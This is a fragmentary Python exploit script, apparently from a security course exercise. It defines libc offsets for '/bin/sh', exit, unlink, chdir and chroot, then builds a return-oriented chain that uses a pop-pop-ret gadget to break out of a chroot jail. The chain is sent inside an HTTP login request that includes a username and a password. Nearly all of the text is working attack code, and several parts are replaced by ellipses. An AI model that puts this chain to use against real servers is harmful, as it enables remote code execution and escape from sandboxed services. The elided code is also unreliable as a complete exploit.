...
# /bin/sh
sh_addr = base_addr + 0x00018b363
# exit
ex_addr = base_addr + 0x000340c0
# unlink
ul_addr = base_addr + 0x000f3e50
# chdir
chdir_addr=base_addr + 0x000f1340
#chroot
chroot_addr=base_addr + 0x000fb160
# dead
d_addr = 0xdeadbeef
# c0ffee00
c_addr = 0xc0ffee00
...
def build_exploit(shellcode):
    ...
    # ebp is nceeded to locate the place of string 
    ...
    '''
    # use ppr to chain the functions
    
    chdir_arg = "..\0\0"
    chroot_arg = ".\0\0\0"
    
    #print(chdir_arg.encode('latin-1'))
    req+=p32(chdir_addr)
    req+=p32(ppr)
    #req+=p32(d_addr)
    req+=p32(ebp_addr+16)
    ...
    req += ("login_username=huxiaowen&login_password=201911757&submit_login=Login").encode('latin-1')
